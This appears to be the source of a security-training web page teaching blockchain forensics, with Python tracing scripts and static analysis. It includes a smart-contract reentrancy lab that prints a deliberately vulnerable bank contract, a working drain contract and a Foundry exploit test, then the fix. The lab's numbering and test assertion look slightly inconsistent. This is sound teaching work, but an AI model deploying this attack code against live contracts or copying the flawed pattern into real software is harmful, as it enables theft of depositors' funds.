'use client'
import React from 'react'
import Link from 'next/link'

const accent = '#ffb347'
const accentDim = 'rgba(255,179,71,0.1)'
const accentBorder = 'rgba(255,179,71,0.3)'

const H2 = ({ num, children }: { num: string; children: React.ReactNode }) => (
  <h2 style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '1rem', fontWeight: 600, color: accent, marginTop: '3rem', marginBottom: '1rem', display: 'flex', alignItems: 'center', gap: '10px' }}>
    <span style={{ background: accentDim, border: '1px solid ' + accentBorder, padding: '2px 8px', borderRadius: '3px', fontSize: '0.65rem', letterSpacing: '0.15em' }}>LAB-{num}</span>
    {children}
  </h2>
)

const H3 = ({ children }: { children: React.ReactNode }) => (
  <h3 style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.82rem', fontWeight: 600, color: '#cc7a00', marginTop: '1.75rem', marginBottom: '0.6rem' }}>▸ {children}</h3>
)

const P = ({ children }: { children: React.ReactNode }) => (
  <p style={{ color: '#8a9a8a', lineHeight: 1.8, marginBottom: '1rem', fontSize: '0.88rem' }}>{children}</p>
)

const Pre = ({ label, children }: { label?: string; children: string }) => (
  <div style={{ margin: '1rem 0 1.5rem' }}>
    {label && <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '9px', color: '#5a4a2a', letterSpacing: '0.15em', marginBottom: '4px', paddingLeft: '4px' }}>{label}</div>}
    <pre style={{ background: '#050805', border: '1px solid #2e1e00', borderRadius: '4px', padding: '1.25rem', overflow: 'auto', color: accent, fontFamily: 'JetBrains Mono, monospace', fontSize: '0.78rem', lineHeight: 1.7, whiteSpace: 'pre' as const }}>{children}</pre>
  </div>
)

const Alert = ({ type, children }: { type: 'objective' | 'warn' | 'note' | 'info'; children: React.ReactNode }) => {
  const configs: Record<string, [string, string, string]> = {
    objective: [accent, accentDim, 'OBJECTIVE'],
    warn: ['#ff4136', 'rgba(255,65,54,0.05)', 'IMPORTANT'],
    note: ['#00d4ff', 'rgba(0,212,255,0.05)', 'BEGINNER NOTE'],
    info: ['#00ff41', 'rgba(0,255,65,0.05)', 'INFO'],
  }
  const [color, bg, label] = configs[type]
  return (
    <div style={{ background: bg, borderLeft: '3px solid ' + color, padding: '1rem 1.25rem', borderRadius: '0 4px 4px 0', margin: '1.25rem 0', border: '1px solid ' + color + '33', borderLeftColor: color }}>
      <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '9px', color, letterSpacing: '0.2em', marginBottom: '6px' }}>{label}</div>
      <div style={{ color: '#8a9a8a', fontSize: '0.85rem', lineHeight: 1.7 }}>{children}</div>
    </div>
  )
}

const CheckItem = ({ children }: { children: React.ReactNode }) => (
  <div style={{ display: 'flex', gap: '10px', alignItems: 'flex-start', padding: '6px 0', borderBottom: '1px solid #0e1a10' }}>
    <span style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '11px', color: '#2a2a10', marginTop: '2px', flexShrink: 0 }}>[ ]</span>
    <span style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem', color: '#5a7a5a', lineHeight: 1.6 }}>{children}</span>
  </div>
)

export default function CryptoLab() {
  return (
    <div>
      {/* Breadcrumb */}
      <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '2rem', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.7rem', color: '#5a7a5a' }}>
        <Link href="/" style={{ color: '#5a7a5a', textDecoration: 'none' }}>GHOSTNET</Link>
        <span>›</span>
        <Link href="/modules/crypto" style={{ color: '#5a7a5a', textDecoration: 'none' }}>MOD-03 // CRYPTO</Link>
        <span>›</span>
        <span style={{ color: accent }}>LAB</span>
        <div style={{ marginLeft: 'auto', display: 'flex', gap: '8px' }}>
          <Link href="/modules/crypto" style={{ textDecoration: 'none', padding: '3px 10px', background: 'transparent', border: '1px solid #1a2e1e', borderRadius: '3px', color: '#5a7a5a', fontSize: '8px', letterSpacing: '0.15em' }}>← CONCEPT</Link>
          <span style={{ padding: '3px 10px', background: accentDim, border: '1px solid ' + accentBorder, borderRadius: '3px', color: accent, fontSize: '8px', letterSpacing: '0.15em' }}>LAB</span>
        </div>
      </div>

      {/* Header */}
      <div style={{ marginBottom: '2.5rem' }}>
        <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '9px', color: '#5a4a2a', letterSpacing: '0.25em', marginBottom: '0.5rem' }}>MODULE 03 · LAB ENVIRONMENT</div>
        <h1 style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '1.8rem', fontWeight: 700, color: accent, margin: '0.5rem 0', lineHeight: 1.1, textShadow: '0 0 20px rgba(255,179,71,0.3)' }}>
          CRYPTO & BLOCKCHAIN — LAB
        </h1>
        <p style={{ color: '#5a7a5a', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.72rem', lineHeight: 1.6 }}>
          6 exercises: BTC transaction tracing · Etherscan wallet analysis · mixer pattern detection · smart contract vulnerability lab · DeFi exploit trace · mini audit report
        </p>
      </div>

      {/* Lab Environment Setup */}
      <div style={{ background: '#0f0b05', border: '1px solid #2e1e00', borderRadius: '6px', padding: '1.5rem', marginBottom: '2rem' }}>
        <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '9px', color: '#5a4a2a', letterSpacing: '0.2em', marginBottom: '1rem' }}>LAB ENVIRONMENT SETUP</div>
        <P>Labs 01-03 (tracing and forensics) only require Python 3 and internet access — they are fully passive. Labs 04-06 require a local Ethereum development environment using Foundry to safely deploy and exploit contracts without real funds.</P>
        <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '1rem', marginTop: '1rem' }}>
          <div style={{ background: '#050805', border: '1px solid #2e1e00', borderRadius: '4px', padding: '1rem' }}>
            <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '9px', color: accent, letterSpacing: '0.15em', marginBottom: '8px' }}>TOOLS NEEDED</div>
            <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.72rem', color: '#5a7a5a', lineHeight: 1.8 }}>
              Python 3 + pip<br />
              requests · web3.py<br />
              Foundry (forge/cast/anvil)<br />
              slither-analyzer · mythril
            </div>
          </div>
          <div style={{ background: '#050805', border: '1px solid #2e1e00', borderRadius: '4px', padding: '1rem' }}>
            <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '9px', color: accent, letterSpacing: '0.15em', marginBottom: '8px' }}>FREE ACCOUNTS</div>
            <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.72rem', color: '#5a7a5a', lineHeight: 1.8 }}>
              Etherscan: etherscan.io/register<br />
              Tenderly: tenderly.co (free plan)<br />
              (Blockchain explorers need no account)
            </div>
          </div>
        </div>
        <div style={{ marginTop: '1rem' }}>
          <CheckItem>Python 3 and pip installed — verify: python3 --version</CheckItem>
          <CheckItem>Read MOD-03 Concept page — understand UTXO model and Ethereum account model</CheckItem>
          <CheckItem>Labs 04-06 require Foundry — install before starting those labs</CheckItem>
          <CheckItem>Never use real funds — all contract labs use local testnet or free testnets (Sepolia)</CheckItem>
          <CheckItem>On-chain forensics labs use historical public data — completely legal research</CheckItem>
        </div>
      </div>

      <Alert type="warn">
        All smart contract exploitation labs use local Foundry testnets or historical mainnet fork data only. Never deploy attack contracts to mainnet or any live network. The techniques taught here are for understanding vulnerabilities in order to build better defences and conduct authorised security audits.
      </Alert>

      {/* LAB 01 */}
      <H2 num="01">Bitcoin Transaction Tracing — Follow the Money</H2>
      <Alert type="objective">
        Manually trace a fund flow across multiple Bitcoin addresses using free blockchain explorers and Python. Build a transaction graph and identify exchange deposit patterns.
      </Alert>
      <Alert type="note">
        Bitcoin uses a UTXO (Unspent Transaction Output) model. Every transaction consumes previous outputs and creates new ones. Unlike bank accounts, a single entity often controls many addresses. Tracing means following UTXOs from address to address until funds reach an exchange or mixing service.
      </Alert>

      <H3>Step 1: Install Python Blockchain Tools</H3>
      <Pre label="// INSTALL DEPENDENCIES">{`pip3 install requests web3 pandas

# Verify:
python3 -c "import requests; print('requests OK')"
python3 -c "from web3 import Web3; print('web3 OK')"

# We will use free public APIs:
# Blockchair API: https://blockchair.com — no key needed for basic queries
# Blockchain.info: https://blockchain.info/api — no key needed
# Etherscan API: https://api.etherscan.io — free key at etherscan.io/register`}</Pre>

      <H3>Step 2: Trace a Bitcoin Address</H3>
      <Pre label="// BITCOIN ADDRESS TRACER">{`import requests, json

def get_btc_address_info(address):
    """Get balance and transaction history for a Bitcoin address"""
    url = "https://blockchair.com/bitcoin/dashboards/address/" + address
    r = requests.get(url, timeout=10)
    if r.status_code != 200:
        return None
    data = r.json()["data"][address]
    addr_data = data["address"]
    return {
        "address": address,
        "balance_btc": addr_data["balance"] / 1e8,
        "received_btc": addr_data["received"] / 1e8,
        "tx_count": addr_data["transaction_count"],
        "transactions": data.get("transactions", [])[:10]
    }

def trace_btc_flow(address):
    """Show where funds went from this address"""
    info = get_btc_address_info(address)
    if not info:
        print("Could not fetch address info")
        return

    print("=" * 60)
    print("ADDRESS: " + info["address"])
    print("Balance: " + str(round(info["balance_btc"], 8)) + " BTC")
    print("Total received: " + str(round(info["received_btc"], 8)) + " BTC")
    print("Transaction count: " + str(info["tx_count"]))
    print()

    # Look up each transaction to find outputs (where funds went)
    for txid in info["transactions"][:3]:
        tx_url = "https://blockchair.com/bitcoin/dashboards/transaction/" + txid
        tx_r = requests.get(tx_url, timeout=10)
        if tx_r.status_code != 200:
            continue
        tx_data = tx_r.json()["data"][txid]
        outputs = tx_data.get("outputs", [])
        print("TX: " + txid[:20] + "...")
        for out in outputs:
            recipient = out.get("recipient", "unknown")
            value = out.get("value", 0) / 1e8
            if recipient != address:
                print("  -> " + recipient + " : " + str(round(value, 8)) + " BTC")

# Practice target: historically significant public address
# (first Bitcoin transaction ever — Satoshi to Hal Finney)
trace_btc_flow("12cbQLTFMXRnSzktFkuoG3eHoMeFtpTu3S")`}</Pre>

      <H3>Step 3: Manual Blockchain Explorer Tracing</H3>
      <Pre label="// MANUAL TRACING WORKFLOW — no coding needed">{`# Use these free explorer websites directly in your browser:

# Bitcoin:
# https://www.blockchain.com/explorer
# https://blockchair.com/bitcoin

# Ethereum:
# https://etherscan.io
# https://beaconcha.in

# Exercise: trace this publicly documented Bitcoin address
# The Silk Road wallet address (seized by FBI in 2013):
ADDR = "1F1tAaz5x1HUXrCNLbtMDqcw6o5GNn4xqX"

# Steps:
# 1. Paste the address into blockchain.com/explorer
# 2. Find all outgoing transactions
# 3. Follow each output address
# 4. Repeat until you hit an exchange deposit address
#    (exchange addresses typically receive from many unrelated sources)

# Document your trace as a tree:
# 1F1tAaz... ->
#   tx abc123 ->
#     Address A: 100 BTC -> ...
#     Address B: 50 BTC  -> Coinbase deposit (many small random inputs mixed)

# How to identify exchange addresses:
# - High transaction count (thousands)
# - Receives from many unrelated sources
# - Tagged by blockchain.com as "Binance", "Coinbase" etc.`}</Pre>

      {/* LAB 02 */}
      <H2 num="02">Ethereum Wallet Analysis with Etherscan</H2>
      <Alert type="objective">
        Use Etherscan and web3.py to analyse Ethereum wallet activity. Trace ETH flows, identify token transfers, and detect mixer patterns.
      </Alert>
      <Alert type="note">
        Ethereum uses an account model rather than UTXOs. Every address has a balance and transaction history. You can also track ERC-20 token transfers separately from ETH. Etherscan provides a free API that returns all of this data in JSON.
      </Alert>

      <H3>Step 1: Query Ethereum via Etherscan API</H3>
      <Pre label="// ETHEREUM TRANSACTION HISTORY">{`import requests

ETHERSCAN_KEY = "YourApiKeyToken"  # free at etherscan.io/register
BASE = "https://api.etherscan.io/api"

def get_eth_balance(address):
    """Get ETH balance for an address"""
    params = {
        "module": "account",
        "action": "balance",
        "address": address,
        "tag": "latest",
        "apikey": ETHERSCAN_KEY
    }
    r = requests.get(BASE, params=params).json()
    wei = int(r.get("result", 0))
    return round(wei / 1e18, 6)

def get_eth_transactions(address, limit=10):
    """Get recent ETH transactions for an address"""
    params = {
        "module": "account",
        "action": "txlist",
        "address": address,
        "sort": "desc",
        "apikey": ETHERSCAN_KEY
    }
    txs = requests.get(BASE, params=params).json().get("result", [])[:limit]
    for tx in txs:
        direction = "OUT" if tx["from"].lower() == address.lower() else "IN "
        eth_val = round(int(tx["value"]) / 1e18, 6)
        to_addr = tx.get("to", "contract creation")[:20]
        print(direction + " | " + tx["hash"][:16] + "..." + " | " + str(eth_val) + " ETH | to: " + to_addr + "...")

# Practice: The DAO attacker address (historically documented exploit)
addr = "0xbb9bc244d798123fde783fcc1c72d3bb8c189413"
print("ETH Balance: " + str(get_eth_balance(addr)))
print()
get_eth_transactions(addr)`}</Pre>

      <H3>Step 2: Track ERC-20 Token Transfers</H3>
      <Pre label="// TRACK TOKEN MOVEMENTS">{`import requests

ETHERSCAN_KEY = "YourApiKeyToken"
BASE = "https://api.etherscan.io/api"

def get_token_transfers(address, limit=10):
    """Get ERC-20 token transfers for an address"""
    params = {
        "module": "account",
        "action": "tokentx",
        "address": address,
        "sort": "desc",
        "apikey": ETHERSCAN_KEY
    }
    txs = requests.get(BASE, params=params).json().get("result", [])[:limit]
    for tx in txs:
        direction = "OUT" if tx["from"].lower() == address.lower() else "IN "
        token = tx.get("tokenSymbol", "???")
        decimals = int(tx.get("tokenDecimal", 18))
        amount = round(int(tx.get("value", 0)) / (10 ** decimals), 4)
        to_addr = tx.get("to", "")[:16]
        print(direction + " | " + token.ljust(8) + " " + str(amount) + " | to: " + to_addr + "...")

# Token flow analysis is critical for DeFi exploit forensics
# Attackers swap stolen ETH to stablecoins, bridge to other chains,
# or use mixers to obscure the trail`}</Pre>

      <H3>Step 3: Detect Mixer Patterns</H3>
      <Pre label="// IDENTIFY MIXING / TUMBLING PATTERNS">{`# Mixer signatures to look for in transaction history:

# 1. Tornado Cash usage (Ethereum mixer — now OFAC sanctioned)
#    Look for transfers to/from: 0x722122dF12D4e14e13Ac3b6895a86e84145b6967
#    Fixed denominations: exactly 0.1 ETH, 1 ETH, 10 ETH, 100 ETH

# 2. Coin join patterns (Bitcoin)
#    - Multiple inputs of similar amounts from different addresses
#    - Multiple outputs of exactly equal amounts
#    - The equality of outputs is the dead giveaway

# 3. Rapid send-and-receive cycles
#    Funds arrive, immediately sent to new address, repeated quickly
#    Amount changes slightly each hop (to confuse tracers)

# 4. Cross-chain bridge hops
#    Funds bridge to another chain (Polygon, Arbitrum)
#    Harder to trace across chains
#    Tools like Arkham Intelligence track cross-chain flows

# Manual check: paste any address into:
# https://app.arkm.com (free tier, cross-chain tracing)
# https://etherscan.io/txs?a=ADDRESS (filter by token/type)

# Look for:
# - Transactions to known mixer contract addresses
# - Equal-value outputs (CoinJoin pattern)
# - Interaction with privacy protocols (Aztec, Umbra)`}</Pre>

      {/* LAB 03 */}
      <H2 num="03">Smart Contract Vulnerability Lab — Reentrancy Attack</H2>
      <Alert type="objective">
        Install Foundry, deploy a reentrancy-vulnerable contract on a local testnet, write an attack contract, and exploit it. Then fix the vulnerability using the Checks-Effects-Interactions pattern.
      </Alert>
      <Alert type="note">
        Reentrancy is one of the most famous smart contract vulnerabilities. It caused the DAO hack in 2016 — $60 million stolen, leading to the Ethereum hard fork. The bug: a contract sends ETH to an attacker before updating its own balance. The attacker&apos;s contract calls back in (re-enters) during the send, draining the bank repeatedly before the balance is ever set to zero.
      </Alert>

      <H3>Step 1: Install Foundry</H3>
      <Pre label="// FOUNDRY INSTALLATION — local Ethereum dev environment">{`# Install Foundry (forge, cast, anvil)
curl -L https://foundry.paradigm.xyz | bash
source ~/.bashrc  # or restart your terminal
foundryup

# Verify installation
forge --version
cast --version
anvil --version

# Create a new project
forge init reentrancy_lab
cd reentrancy_lab

# Start a local Ethereum testnet in a separate terminal
anvil
# Output: 10 funded test accounts, each with 10000 ETH (fake)
# RPC URL: http://127.0.0.1:8545  — use this in forge commands`}</Pre>

      <H3>Step 2: Deploy Vulnerable Contract</H3>
      <Pre label="// src/VulnerableBank.sol">{`// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// This contract has a CRITICAL bug — state update happens AFTER external call
contract VulnerableBank {
    mapping(address => uint256) public balances;

    // Users deposit ETH here
    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    // BUG: sends ETH BEFORE updating balance (wrong order)
    function withdraw() external {
        uint256 amount = balances[msg.sender];
        require(amount > 0, "Nothing to withdraw");

        // Step 1: Send ETH (this can call attacker code)
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");

        // Step 2: Update balance (TOO LATE — attacker already re-entered)
        balances[msg.sender] = 0;
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}`}</Pre>

      <Pre label="// src/Attacker.sol">{`// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IBank {
    function deposit() external payable;
    function withdraw() external;
    function getBalance() external view returns (uint256);
}

contract Attacker {
    IBank public bank;
    address public owner;
    uint256 public attackCount;

    constructor(address _bank) {
        bank = IBank(_bank);
        owner = msg.sender;
    }

    // Step 1: Attacker deposits 1 ETH legitimately, then calls withdraw
    function attack() external payable {
        require(msg.value >= 1 ether, "Need at least 1 ETH to start");
        bank.deposit{value: msg.value}();
        bank.withdraw();
    }

    // Step 2: Every time bank sends ETH to this contract,
    // this receive() function is called automatically
    // We use it to call withdraw() again before bank updates our balance
    receive() external payable {
        attackCount++;
        // Keep re-entering until bank is drained (max 10 times)
        if (address(bank).balance >= 1 ether && attackCount < 10) {
            bank.withdraw();
        }
    }

    // Collect the stolen funds
    function drain() external {
        require(msg.sender == owner, "Not owner");
        payable(owner).transfer(address(this).balance);
    }
}`}</Pre>

      <H3>Step 3: Write and Run the Exploit Test</H3>
      <Pre label="// test/Reentrancy.t.sol">{`// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/VulnerableBank.sol";
import "../src/Attacker.sol";

contract ReentrancyTest is Test {
    VulnerableBank bank;
    Attacker attacker;

    address victim = address(0x1);
    address attackerAddr = address(0x2);

    function setUp() public {
        bank = new VulnerableBank();
        attacker = new Attacker(address(bank));

        // Victim deposits 10 ETH into the bank
        vm.deal(victim, 10 ether);
        vm.prank(victim);
        bank.deposit{value: 10 ether}();

        console.log("Bank balance before attack:", bank.getBalance());
    }

    function testReentrancyDrainsBank() public {
        // Attacker starts with 1 ETH
        vm.deal(attackerAddr, 1 ether);
        vm.prank(attackerAddr);
        attacker.attack{value: 1 ether}();

        console.log("Bank balance after attack:", bank.getBalance());
        console.log("Attacker contract holds:", address(attacker).balance);
        console.log("Re-entry count:", attacker.attackCount());

        // Bank should be empty — victim lost their 10 ETH
        assertEq(bank.getBalance(), 0, "Bank should be drained");
    }
}

// Run with: forge test --match-test testReentrancyDrainsBank -vvvv`}</Pre>

      <H3>Step 4: Fix with Checks-Effects-Interactions Pattern</H3>
      <Pre label="// src/SecureBank.sol — the fix">{`// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// FIXED: state updated BEFORE external call (Checks-Effects-Interactions pattern)
contract SecureBank {
    mapping(address => uint256) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external {
        uint256 amount = balances[msg.sender];
        require(amount > 0, "Nothing to withdraw");

        // CHECKS: amount > 0 (done above)

        // EFFECTS: update state FIRST — before any external call
        balances[msg.sender] = 0;

        // INTERACTIONS: now safe to send — re-entry will find balance = 0
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
    }
}

// Try the same attack against SecureBank:
// forge test --match-test testAttackSecureBank -vvvv
// The attack fails because re-entry finds balances[attacker] = 0`}</Pre>

      {/* LAB 04 */}
      <H2 num="04">DeFi Exploit Trace — Flash Loan Anatomy</H2>
      <Alert type="objective">
        Understand how flash loan attacks work by tracing a historical DeFi exploit using Tenderly and Phalcon block explorer. Reproduce the call structure in a Foundry fork test.
      </Alert>
      <Alert type="note">
        A flash loan lets you borrow any amount of tokens with zero collateral — as long as you repay within the same transaction. Attackers use them to temporarily hold millions of dollars, manipulate a price oracle, exploit a vulnerable protocol, then repay — all in one atomic transaction. The attack costs only gas fees.
      </Alert>

      <H3>Step 1: Trace the Euler Finance Hack on Tenderly</H3>
      <Pre label="// EULER FINANCE HACK — March 2023, ~$197M stolen">{`# The exploit transaction hash (publicly documented):
EXPLOIT_TX = "0xc310a0affe2169d1f6feec1c63dbc7f7c62a887ad7a5de5f7b2c9fe93c54dcf4"

# Step 1: Open Tenderly (free account)
# URL: https://dashboard.tenderly.co
# Paste the tx hash in search

# What Tenderly shows:
# - Full call tree: every function call with arguments and return values
# - State diffs: exactly which storage slots changed and by how much
# - Token transfers: who sent what token to whom
# - Gas cost per function call

# Step 2: Open Phalcon (no account needed)
# URL: https://explorer.phalcon.xyz/tx/eth/TXHASH
# Better for visualising fund flow: shows a diagram
# of tokens moving between protocols

# What to document from the trace:
# 1. What flash loan was taken? (token, amount, lender protocol)
# 2. What vulnerable function was called?
# 3. What was the logical flaw? (oracle manipulation? missing check?)
# 4. How were funds extracted from the victim protocol?
# 5. How was the flash loan repaid?

# Step 3: Read the post-mortem
# Official: https://medium.com/@euler_mav/post-mortem-e (search for "Euler Finance post mortem")
# Rekt.news: search "Euler Rekt" for the community writeup`}</Pre>

      <H3>Step 2: Foundry Fork — Test Against Real State</H3>
      <Pre label="// RUN AGAINST REAL MAINNET STATE (SAFE LOCAL)">{`# Foundry can fork mainnet at any block number
# This gives you a local copy with real token balances, real contracts
# Useful for reproducing historical exploits safely

# Fork at block just before the Euler hack:
anvil --fork-url https://eth.llamarpc.com --fork-block-number 16817994

# Or in a Foundry test:
# In foundry.toml:
#   [profile.default]
#   fork_url = "https://eth.llamarpc.com"

# In your test:
# vm.createFork("mainnet", 16817994) to fork at specific block
# vm.selectFork(forkId) to switch to the fork

# Research resources for DeFi exploit reproduction:
# - DeFiHackLabs: github.com/SunWeb3Sec/DeFiHackLabs
#   Foundry PoCs for 200+ historical DeFi hacks
# - https://www.damnvulnerabledefi.xyz — safe CTF versions`}</Pre>

      {/* LAB 05 */}
      <H2 num="05">Static Analysis — Automated Vulnerability Detection</H2>
      <Alert type="objective">
        Run Slither and Mythril against Solidity contracts to automatically detect vulnerability classes. Learn to read the output and triage findings by severity.
      </Alert>

      <H3>Step 1: Run Slither</H3>
      <Pre label="// SLITHER — STATIC ANALYSIS">{`# Install Slither
pip3 install slither-analyzer

# Analyse a single contract
slither src/VulnerableBank.sol

# Expected output for our reentrancy contract:
# VulnerableBank.withdraw() (src/VulnerableBank.sol#...)
#   Reentrancy in VulnerableBank.withdraw():
#   External calls: (success) = msg.sender.call{value: amount}("")
#   State variables written after the call: balances[msg.sender] = 0
#   Reference: https://github.com/crytic/slither/wiki/Detector-Documentation

# Run on an entire project (src/ folder):
slither . --exclude-dependencies

# Only high and medium severity:
slither . --detect reentrancy-eth,reentrancy-no-eth,suicidal,controlled-delegatecall

# Human-readable summary:
slither . --print human-summary

# Slither detectors cover: reentrancy, integer overflow, unprotected self-destruct,
# tx.origin auth, price oracle manipulation, unchecked low-level calls, and more`}</Pre>

      <H3>Step 2: Practice on Real Vulnerable Contracts</H3>
      <Pre label="// PRACTICE TARGETS — CTF AND TRAINING CONTRACTS">{`# 1. Damn Vulnerable DeFi (best for DeFi-specific vulns)
git clone https://github.com/tinchoabbate/damn-vulnerable-defi
cd damn-vulnerable-defi
npm install
# Run Slither on each contract in contracts/
slither contracts/unstoppable/UnstoppableVault.sol

# 2. Ethernaut (OpenZeppelin's Solidity challenges)
# Play at: https://ethernaut.openzeppelin.com
# Source: https://github.com/OpenZeppelin/ethernaut
# Each level is a real vulnerability class

# 3. Capture The Ether
# Play at: https://capturetheether.com
# Classic Solidity challenges: integer overflow, guess the number, etc.

# For each target, your workflow:
# a. Read the contract source code
# b. Run Slither and note all findings
# c. Classify each finding: Critical / High / Medium / Low / Info
# d. Write a PoC exploit (Foundry test) for critical/high findings
# e. Write the fix`}</Pre>

      {/* LAB 06 */}
      <H2 num="06">Mini Audit Report — Professional Format</H2>
      <Alert type="objective">
        Run a complete audit workflow against a practice DeFi contract. Document findings in the standard professional format used by top audit firms (Code4rena, Sherlock, Cantina).
      </Alert>

      <H3>Audit Workflow</H3>
      <Pre label="// COMPLETE AUDIT PROCESS">{`# 1. Manual review first — understand what the protocol does
#    Read every function, understand the intended behaviour
#    Draw a diagram of the token flows

# 2. Automated tools
slither contracts/ --exclude-dependencies --json slither_output.json
# Review every finding — many will be false positives

# 3. Property-based fuzzing with Foundry
# In your test file, add fuzz tests:
# function testFuzz_withdraw(uint96 amount) public {
#     vm.assume(amount > 0);
#     // Foundry tries thousands of random inputs automatically
# }

# 4. Write findings in this standard format:`}</Pre>

      <Pre label="// FINDING REPORT TEMPLATE">{`# [H-01] Reentrancy in VulnerableBank.withdraw() allows full fund drain

## Severity
HIGH — funds can be stolen

## Summary
The withdraw() function sends ETH to the caller before updating the
caller's balance. An attacker contract can re-enter withdraw() during
the ETH transfer, repeatedly draining the bank before any balance
update occurs.

## Vulnerability Details
The state update (balances[msg.sender] = 0) occurs on line 19, AFTER
the external call on line 15. This violates the Checks-Effects-Interactions
pattern. During the external call, the attacker's receive() function can
call withdraw() again, and since balances[msg.sender] is still non-zero,
the check passes and more ETH is sent.

## Impact
An attacker with any balance in the bank can drain the entire contract,
stealing all funds from all depositors.

## Proof of Concept
See: test/Reentrancy.t.sol, testReentrancyDrainsBank()
Running "forge test --match-test testReentrancyDrainsBank -vvvv"
demonstrates the bank balance reaching 0 from an initial 10 ETH.

## Recommended Fix
Apply the Checks-Effects-Interactions pattern: update balances[msg.sender]
to 0 BEFORE making the external call.

## References
- SWC-107: https://swcregistry.io/docs/SWC-107
- The DAO Hack (2016): same vulnerability, $60M stolen`}</Pre>

      {/* Check Your Understanding */}
      <div style={{ marginTop: '3rem', background: '#0f0b05', border: '1px solid ' + accentBorder, borderRadius: '6px', padding: '1.5rem' }}>
        <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '9px', color: accent, letterSpacing: '0.2em', marginBottom: '1rem' }}>CHECK YOUR UNDERSTANDING</div>
        <P>You should be able to answer all of these before moving to the next module.</P>
        {[
          'What is the UTXO model? How does it differ from the Ethereum account model, and why does the difference matter for tracing?',
          'In the reentrancy attack, what is the exact sequence of events that allows the attacker to withdraw more than they deposited?',
          'What does the Checks-Effects-Interactions pattern mean? Write the three steps in order.',
          'What is a flash loan? Why does it cost near-zero capital to execute a flash loan attack?',
          'You are auditing a contract and Slither flags an "unchecked return value" on a low-level call. What risk does this represent?',
        ].map((q, i) => (
          <div key={i} style={{ display: 'flex', gap: '10px', padding: '8px 0', borderBottom: '1px solid #0a0802', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.72rem' }}>
            <span style={{ color: accent, flexShrink: 0 }}>{String(i + 1).padStart(2, '0')}.</span>
            <span style={{ color: '#5a7a5a' }}>{q}</span>
          </div>
        ))}
      </div>

      {/* Recommended Practice */}
      <div style={{ marginTop: '2rem', background: '#0f0b05', border: '1px solid #2e1e00', borderRadius: '6px', padding: '1.5rem' }}>
        <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '9px', color: '#5a4a2a', letterSpacing: '0.2em', marginBottom: '1rem' }}>RECOMMENDED PRACTICE</div>
        {[
          { platform: 'TryHackMe', name: 'Blockchain Basics', note: 'Covers Bitcoin/Ethereum fundamentals, transaction anatomy, and wallet concepts — essential background for the tracing labs' },
          { platform: 'OpenZeppelin', name: 'Ethernaut', note: 'Web-based Solidity challenges — each level is a real vulnerability class. Complete the first 10 levels to cover all core attack patterns' },
          { platform: 'Damn Vulnerable DeFi', name: 'All Challenges', note: '15 DeFi-specific challenges: flash loans, price oracle manipulation, reentrancy, governance attacks — industry-standard training for auditors' },
          { platform: 'HackTheBox', name: 'Blockchain CTF Challenges', note: 'On-chain forensics and smart contract exploitation challenges in HTB CTF format' },
        ].map((r, i) => (
          <div key={i} style={{ padding: '10px 0', borderBottom: '1px solid #0a0802' }}>
            <div style={{ display: 'flex', gap: '8px', alignItems: 'center', marginBottom: '4px' }}>
              <span style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '8px', color: accent, background: accentDim, border: '1px solid ' + accentBorder, padding: '1px 6px', borderRadius: '2px' }}>{r.platform}</span>
              <span style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem', color: '#8a9a8a', fontWeight: 600 }}>{r.name}</span>
            </div>
            <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.68rem', color: '#5a4a2a', paddingLeft: '4px' }}>{r.note}</div>
          </div>
        ))}
      </div>

      {/* Footer nav */}
      <div style={{ marginTop: '3rem', paddingTop: '2rem', borderTop: '1px solid #2e1e00', display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
        <Link href="/modules/crypto" style={{ textDecoration: 'none', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem', color: '#5a7a5a' }}>← BACK TO CONCEPT</Link>
        <Link href="/" style={{ textDecoration: 'none', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem', color: '#5a4a2a' }}>DASHBOARD</Link>
        <Link href="/modules/offensive/lab" style={{ textDecoration: 'none', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem', color: accent, padding: '8px 20px', border: '1px solid ' + accentBorder, borderRadius: '4px', background: accentDim }}>
          NEXT: MOD-04 OFFENSIVE LAB →
        </Link>
      </div>
    </div>
  )
}
